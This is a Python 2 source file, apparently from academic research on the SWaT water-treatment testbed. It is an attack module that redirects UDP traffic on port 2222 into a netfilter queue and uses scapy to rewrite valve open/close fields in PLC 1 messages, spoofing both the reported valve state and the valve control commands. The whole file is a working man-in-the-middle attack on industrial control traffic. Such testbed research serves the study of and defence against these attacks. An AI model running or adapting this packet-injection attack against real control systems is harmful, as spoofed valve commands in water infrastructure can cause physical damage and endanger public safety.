#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2015 David I. Urbina, david.urbina@utdallas.edu
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
"""Secure Water Testbed (SWaT) Singapore University of Technology and Design.
SWATAttack module to control the valve in PLC 1.
"""
from __future__ import print_function

import datetime
import os
import sys
from netfilterqueue import NetfilterQueue

from scapy.layers.inet import IP
from scapy.layers.inet import UDP

from swat.plc1 import SWAT_P1_RIO_DI, SWAT_P1_RIO_DO

# Parameters list
_valve_in = True  # True is open, False is close
_valve_out = True  # True is open, False is close


def __inject(packet):
    pkt = IP(packet.get_payload())
    if SWAT_P1_RIO_DI in pkt:
        pkt[SWAT_P1_RIO_DI].valve_close = 0 if _valve_in else 1
        pkt[SWAT_P1_RIO_DI].valve_open = 1 if _valve_in else 0
        del pkt[UDP].chksum  # Need to recompute checksum
        packet.set_payload(str(pkt))

    if SWAT_P1_RIO_DO in pkt:
        if pkt[SWAT_P1_RIO_DO].number == 1:  # To avoid Multicast with same length
            pkt[SWAT_P1_RIO_DO].valve_close = 0 if _valve_out else 1
            pkt[SWAT_P1_RIO_DO].valve_open = 1 if _valve_out else 0
            del pkt[UDP].chksum  # Need to recompute checksum
            packet.set_payload(str(pkt))

    packet.accept()


def start():
    __setup()
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, __inject)
    try:
        print(datetime.datetime.now())
        print("[*] starting valve spoofing")
        nfqueue.run()
    except KeyboardInterrupt:
        __setdown()
        print("[*] stopping valve spoofing")
        nfqueue.unbind()
        print(datetime.datetime.now())
    return 1


def configure():
    global _valve_in, _valve_out
    valve = input('Set valve state Open(1) or Close(0):')
    _valve_in = True if valve else False
    valve = input('Set valve control Open(1) or Close(0):')
    _valve_out = True if valve else False
    params()


def params():
    state = 'Open' if _valve_in else 'Close'
    value = 1 if _valve_in else 0
    print('Valve state: {} ({})'.format(state, value))
    state = 'Open' if _valve_out else 'Close'
    value = 1 if _valve_out else 0
    print('Valve control: {} ({})'.format(state, value))


def __setup():
    os.system('sudo iptables -t mangle -A PREROUTING -p udp --dport 2222 -j NFQUEUE')


def __setdown():
    os.system('sudo iptables -t mangle -F')


if __name__ == '__main__':
    sys.exit(start())
